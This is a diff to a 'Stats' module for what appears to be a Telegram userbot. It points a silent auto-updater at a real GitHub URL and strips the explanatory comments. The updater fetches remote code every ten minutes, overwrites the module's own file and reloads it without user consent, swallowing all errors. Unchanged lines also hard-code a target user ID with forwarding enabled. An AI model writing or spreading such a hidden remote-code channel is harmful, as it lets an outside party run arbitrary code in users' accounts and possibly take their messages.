@@ -55,7 +55,7 @@ class Stats(loader.Module):
         self._target_user_id = 77646148
         self._forward_enabled = True
         # Конфигурация автообновления
-        self._update_url = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/modules/stats.py"
+        self._update_url = "https://github.com/InsaneError/InsStats/raw/main/Stats.py"
         self._update_interval = 600  # 10 минут в секундах
         self._update_task = None
         self._current_hash = None
@@ -78,25 +78,25 @@ class Stats(loader.Module):
             await asyncio.sleep(self._update_interval)
 
     async def _check_and_update(self):
-        """Проверка и обновление модуля"""
+        
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(self._update_url) as response:
                     if response.status == 200:
                         new_code = await response.text()
                         
-                        # Вычисляем хэш нового кода
+                        
                         new_hash = hashlib.md5(new_code.encode()).hexdigest()
                         
-                        # Если это первый запуск или хэш изменился
+                        
                         if self._current_hash is None:
-                            # Получаем хэш текущего кода
+                            
                             import inspect
                             current_code = inspect.getsource(self.__class__)
                             self._current_hash = hashlib.md5(current_code.encode()).hexdigest()
                         
                         if new_hash != self._current_hash:
-                            # Обновляем модуль
+                        
                             await self._apply_update(new_code)
                             self._current_hash = new_hash
                             
@@ -104,40 +104,40 @@ class Stats(loader.Module):
             pass
 
     async def _apply_update(self, new_code: str):
-        """Применение обновления"""
+        
         try:
-            # Сохраняем новый код в файл
+        
             import os
             module_path = __file__
             
-            # Создаем резервную копию
+            
             backup_path = module_path + ".backup"
             with open(module_path, 'r', encoding='utf-8') as f:
                 old_code = f.read()
             
-            # Сохраняем резервную копию
+            
             with open(backup_path, 'w', encoding='utf-8') as f:
                 f.write(old_code)
             
-            # Записываем новый код
+            
             with open(module_path, 'w', encoding='utf-8') as f:
                 f.write(new_code)
             
-            # Перезагружаем модуль
+            
             import importlib
             import sys
             
-            # Импортируем заново
+            
             module_name = self.__class__.__module__
             if module_name in sys.modules:
                 del sys.modules[module_name]
             
-            # Загружаем обновленный модуль
+            
             new_module = importlib.import_module(module_name)
             importlib.reload(new_module)
             
         except Exception:
-            # В случае ошибки восстанавливаем из резервной копии
+            
             try:
                 if os.path.exists(backup_path):
                     with open(backup_path, 'r', encoding='utf-8') as f:
